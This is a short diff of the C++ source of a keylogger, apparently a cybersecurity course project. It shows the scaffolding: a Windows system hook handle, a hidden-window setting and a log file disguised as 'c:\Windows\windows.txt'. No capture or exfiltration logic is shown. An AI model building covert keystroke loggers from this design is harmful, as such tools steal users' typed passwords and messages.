@@ -1,16 +1,7 @@
 // CYBR4450-KeyLogger.cpp : Defines the entry point for the console application.
 //
 
-#include <Windows.h>
-#include <time.h>
-#include <iostream>
-#include <cstdio>
-#include <tchar.h>
-#include <ctime>
-#include <strsafe.h>
-#include <csignal>
-
-#include "stdafx.h";
+#include "stdafx.h"
 
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
@@ -19,11 +10,11 @@
 // System Hook
 HHOOK _hook;
 
-const char *path = "c:\\Windows\\windows.txt";
+static const char *path = "c:\\Windows\\windows.txt";
 
-char lastwindow[256] = {};
+extern char lastwindow[256] = {};
 
-char buffer[300] = {};
+extern char buffer[300] = {};
 
 DWORD startTime;
 std::string GetWindowInformation() 
